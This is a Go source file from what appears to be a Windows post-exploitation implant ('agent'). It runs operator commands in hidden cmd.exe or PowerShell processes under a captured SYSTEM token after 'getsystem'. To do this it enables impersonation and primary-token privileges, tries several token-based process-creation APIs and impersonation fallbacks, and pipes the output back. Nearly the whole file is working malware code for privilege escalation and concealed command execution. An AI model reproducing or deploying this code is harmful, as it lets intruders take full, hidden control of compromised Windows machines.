//go:build windows

package agent

import (
	"fmt"
	"os/exec"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	procCreateProcessWithTokenW2 = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessWithTokenW")
	procCreateProcessAsUserW2    = windows.NewLazySystemDLL("advapi32.dll").NewProc("CreateProcessAsUserW")
	procPeekNamedPipe2          = windows.NewLazySystemDLL("kernel32.dll").NewProc("PeekNamedPipe")
	procGetExitCodeProcess2     = windows.NewLazySystemDLL("kernel32.dll").NewProc("GetExitCodeProcess")
	procTerminateProcess2       = windows.NewLazySystemDLL("kernel32.dll").NewProc("TerminateProcess")
)

func winErrno(err error) uint32 {
	if errno, ok := err.(syscall.Errno); ok {
		return uint32(errno)
	}
	return 0
}

func makeShellCmd(cmd string) *exec.Cmd {
	c := exec.Command("cmd.exe")
	c.SysProcAttr = &windows.SysProcAttr{
		CmdLine:    `/S /C "` + cmd + `"`,
		HideWindow: true,
	}
	return c
}

// makeInteractiveShellCmd keeps the interactive shell on the SYSTEM token
// after getsystem.  os/exec propagates its stdin/stdout/stderr pipes while the
// token is supplied through the Windows STARTUPINFO process attributes.
func makeInteractiveShellCmd(shell string) *exec.Cmd {
	var c *exec.Cmd
	if shell == "ps" || shell == "powershell" {
		c = exec.Command("powershell.exe", "-NoLogo", "-NoProfile", "-NonInteractive")
	} else {
		c = exec.Command("cmd.exe", "/Q")
	}
	if gSystemToken != 0 {
		c.SysProcAttr = &windows.SysProcAttr{
			Token:      syscall.Token(gSystemToken),
			HideWindow: true,
		}
	} else {
		c.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	}
	return c
}

// runShellSystemHook runs cmd as SYSTEM when gSystemToken is set.
// Uses direct Win32 calls (same pattern as the C agent) to avoid Go's
// exec layer, which relies on the process token for CreateProcessWithTokenW
// privilege checks in some codepaths.
func runShellSystemHook(cmd string) (out string, handled bool, err error) {
	if gSystemToken == 0 {
		return "", false, nil
	}
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	return shellDirectAsSystem(cmd, windows.Handle(gSystemToken)), true, nil
}

// shellDirectAsSystem creates a cmd.exe process using the supplied primary token
// via raw Win32 calls, capturing stdout+stderr through a pipe.
func shellDirectAsSystem(cmd string, token windows.Handle) string {
	// Keep the command line separate from the application path.  This avoids
	// cmd.exe's /s quote stripping and lets the token APIs launch the exact
	// system binary with a deterministic working directory.
	shellArgs := `/d /c ` + cmd + ` 2>&1`
	wargs, _ := syscall.UTF16PtrFromString(shellArgs)
	wargsAsUser, _ := syscall.UTF16PtrFromString(shellArgs)

	sa := windows.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle: 1,
	}
	var hRead, hWrite windows.Handle
	if err := windows.CreatePipe(&hRead, &hWrite, &sa, 0); err != nil {
		return fmt.Sprintf("[CreatePipe: %v]", err)
	}
	_ = windows.SetHandleInformation(hRead, windows.HANDLE_FLAG_INHERIT, 0)

	var si windows.StartupInfo
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = windows.STARTF_USESTDHANDLES | windows.STARTF_USESHOWWINDOW
	si.ShowWindow = 0 // SW_HIDE
	si.StdOutput = hWrite
	si.StdErr = hWrite
	// StdInput = 0 (NULL) — child does not need interactive stdin

	// CreateProcessWithTokenW checks SeImpersonatePrivilege on the caller;
	// CreateProcessAsUserW additionally uses SeIncreaseQuota/SeAssignPrimaryToken.
	// Enable them when present, but retain the explicit error diagnostics below
	// for filtered tokens where one of them is unavailable.
	_ = enablePrivilege("SeImpersonatePrivilege")
	_ = enablePrivilege("SeIncreaseQuotaPrivilege")
	_ = enablePrivilege("SeAssignPrimaryTokenPrivilege")
	_ = enableTokenPrivilege(token, "SeImpersonatePrivilege")
	_ = enableTokenPrivilege(token, "SeIncreaseQuotaPrivilege")
	_ = enableTokenPrivilege(token, "SeAssignPrimaryTokenPrivilege")

	var pi windows.ProcessInformation
	cmdApp, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\cmd.exe`)
	cmdCwd, _ := syscall.UTF16PtrFromString(`C:\Windows\System32`)
	var withTokenErr, asUserErr, impersonateErr uint32
	var r uintptr
	r, _, e := procCreateProcessWithTokenW2.Call(
		uintptr(token),
		0,                             // dwLogonFlags = 0
		uintptr(unsafe.Pointer(cmdApp)),
		uintptr(unsafe.Pointer(wargs)), // lpCommandLine
		0x08000000,                    // dwCreationFlags = CREATE_NO_WINDOW
		0, uintptr(unsafe.Pointer(cmdCwd)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		withTokenErr = winErrno(e)
		r, _, e = procCreateProcessAsUserW2.Call(
			uintptr(token),
			uintptr(unsafe.Pointer(cmdApp)),
			uintptr(unsafe.Pointer(wargsAsUser)),
			0, 0, 1, 0x08000000, 0,
			uintptr(unsafe.Pointer(cmdCwd)),
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)
		if r == 0 {
			asUserErr = winErrno(e)
		}
	}
	// Some restricted tokens only succeed after the caller temporarily
	// impersonates the primary token.  This is the last retry; always revert.
	if r == 0 {
		if ir, _, ie := procImpersonateLoggedOnUser.Call(uintptr(token)); ir == 0 {
			impersonateErr = winErrno(ie)
		} else {
			wargsRetry, _ := syscall.UTF16PtrFromString(shellArgs)
			r, _, e = procCreateProcessWithTokenW2.Call(
				uintptr(token), 0, uintptr(unsafe.Pointer(cmdApp)),
				uintptr(unsafe.Pointer(wargsRetry)), 0x08000000, 0,
				uintptr(unsafe.Pointer(cmdCwd)), uintptr(unsafe.Pointer(&si)),
				uintptr(unsafe.Pointer(&pi)))
			if r == 0 {
				withTokenErr = winErrno(e)
			}
			_, _, _ = procRevertToSelf2.Call()
		}
	}
	_ = windows.CloseHandle(hWrite)
	if r == 0 {
		_ = windows.CloseHandle(hRead)
		return fmt.Sprintf("[error: SYSTEM shell launch; WithToken=%d; AsUser=%d; Impersonate=%d]",
			withTokenErr, asUserErr, impersonateErr)
	}

	var buf []byte
	tmp := make([]byte, 512)
	var nr uint32
	deadline := time.Now().Add(60 * time.Second)
	var exitCode uint32 = 259 // STILL_ACTIVE
	var exitErr uint32
	timedOut := false
	for {
		var avail uint32
		peek, _, _ := procPeekNamedPipe2.Call(uintptr(hRead), 0, 0, 0,
			uintptr(unsafe.Pointer(&avail)), 0)
		if peek != 0 && avail > 0 {
			want := avail
			if want > uint32(len(tmp)) {
				want = uint32(len(tmp))
			}
			if readErr := windows.ReadFile(hRead, tmp[:want], &nr, nil); readErr == nil && nr > 0 {
				buf = append(buf, tmp[:nr]...)
				continue
			}
		}
		if ok, _, ge := procGetExitCodeProcess2.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode))); ok == 0 {
			exitErr = winErrno(ge)
		} else if exitCode != 259 {
			// Drain bytes that arrived with process termination.
			for {
				var tail uint32
				p, _, _ := procPeekNamedPipe2.Call(uintptr(hRead), 0, 0, 0,
					uintptr(unsafe.Pointer(&tail)), 0)
				if p == 0 || tail == 0 {
					break
				}
				want := tail
				if want > uint32(len(tmp)) {
					want = uint32(len(tmp))
				}
				if windows.ReadFile(hRead, tmp[:want], &nr, nil) != nil || nr == 0 {
					break
				}
				buf = append(buf, tmp[:nr]...)
			}
			break
		}
		if time.Now().After(deadline) {
			timedOut = true
			_, _, _ = procTerminateProcess2.Call(uintptr(pi.Process), 1)
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	if timedOut && len(buf) == 0 {
		_ = windows.CloseHandle(hRead)
		_ = windows.CloseHandle(pi.Process)
		_ = windows.CloseHandle(pi.Thread)
		return "[error: SYSTEM shell capture timed out]"
	}
	_ = windows.CloseHandle(hRead)
	_ = windows.CloseHandle(pi.Process)
	_ = windows.CloseHandle(pi.Thread)
	if len(buf) == 0 {
		return fmt.Sprintf("[error: SYSTEM shell capture empty; exit=%d; exit_error=%d; WithToken=%d; AsUser=%d]",
			exitCode, exitErr, withTokenErr, asUserErr)
	}
	return string(buf)
}

// enableTokenPrivilege adjusts a privilege on a duplicated primary token.
// The caller may not have every privilege in a filtered token, so failures
// are intentionally returned to the caller and handled as launch diagnostics.
func enableTokenPrivilege(token windows.Handle, name string) error {
	privName, _ := syscall.UTF16PtrFromString(name)
	var luid windows.LUID
	r, _, e := procLookupPrivilegeValueW.Call(0, uintptr(unsafe.Pointer(privName)), uintptr(unsafe.Pointer(&luid)))
	if r == 0 {
		return e
	}
	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED}},
	}
	r, _, e = procAdjustTokenPrivileges.Call(uintptr(token), 0, uintptr(unsafe.Pointer(&tp)), 0, 0, 0)
	if r == 0 {
		return e
	}
	if errno, ok := e.(syscall.Errno); ok && errno == 1300 {
		return fmt.Errorf("privilege not held by token")
	}
	return nil
}
